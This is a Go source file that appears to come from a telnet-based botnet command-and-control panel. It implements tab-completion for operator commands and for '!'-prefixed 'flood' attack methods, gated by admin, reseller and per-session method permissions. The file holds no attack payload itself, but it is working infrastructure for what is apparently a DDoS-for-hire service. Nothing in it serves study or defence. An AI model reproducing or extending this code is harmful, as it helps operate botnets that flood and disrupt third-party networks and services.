package master

import (
	"advanced-telnet-cnc/source/master/command"
	"advanced-telnet-cnc/source/master/flood"
	"math/rand"
	"sort"
	"strings"
)

func (master *Master) AutoComplete(line string, pos int, key rune) (newLine string, newPos int, ok bool) {
	if key != 9 {
		return
	}

	if strings.HasSuffix(line[:pos], " ") {
		return
	}

	fields := strings.Fields(line[:pos])
	isFirst := len(fields) < 2
	partial := ""
	if len(fields) > 0 {
		partial = fields[len(fields)-1]
	}

	posPartial := pos - len(partial)

	var completed string
	if isFirst && strings.HasPrefix(line, "!") {
		completed = master.GetClosestMethod(line)
	} else {
		completed = master.GetClosestCommand(line)
	}

	// Reposition the cursor
	newLine = strings.Replace(line[posPartial:], partial, completed, 1)
	newLine = line[:posPartial] + newLine
	newPos = pos + (len(completed) - len(partial))
	ok = true

	return
}

func (master *Master) GetAllAliases() []string {
	var lol []string
	for _, cmd := range command.Clone() {
		if (cmd.Admin && !master.Session.Admin) || (cmd.Reseller && !(master.Session.Reseller || master.Session.Admin)) {
			continue
		}

		for _, alias := range cmd.Aliases {
			lol = append(lol, alias)
		}
	}

	return lol
}

func (master *Master) GetClosestCommand(value string) string {
	aliases := master.GetAllAliases()

	if len(value) == 0 && master.CommandIndex == 0 {
		randomIndex := rand.Intn(len(aliases))
		master.CommandIndex = randomIndex + 1 // Increase the index to go to the next command
		return aliases[randomIndex]
	}

	sort.Slice(aliases, func(i, j int) bool {
		return len(aliases[i]) < len(aliases[j])
	})

	for i := 0; i < len(aliases); i++ {
		s := aliases[i]

		if strings.HasPrefix(s, value) {
			master.CommandIndex = i + 1
			return s
		}
	}

	master.CommandIndex = 0
	return ""
}

func (master *Master) GetClosestMethod(value string) string {
	methodKeys := make([]string, 0, len(flood.Methods))

	for key := range flood.Methods {
		methodKeys = append(methodKeys, key)
	}

	if value == "!" && master.MethodIndex == 0 {
		randomIndex := rand.Intn(len(methodKeys))
		master.MethodIndex = randomIndex + 1 // Increase the index to go to the next method
		return methodKeys[randomIndex]
	}

	sort.Slice(methodKeys, func(i, j int) bool {
		return len(methodKeys[i]) < len(methodKeys[j])
	})

	for i := 0; i < len(methodKeys); i++ {
		s := methodKeys[i]
		method := flood.Methods[s]

		if !master.Session.MethodAllowed(method.ID) {
			continue
		}

		if strings.HasPrefix(s, value) {
			master.MethodIndex = i + 1
			return s
		}
	}

	master.MethodIndex = 0
	return ""
}
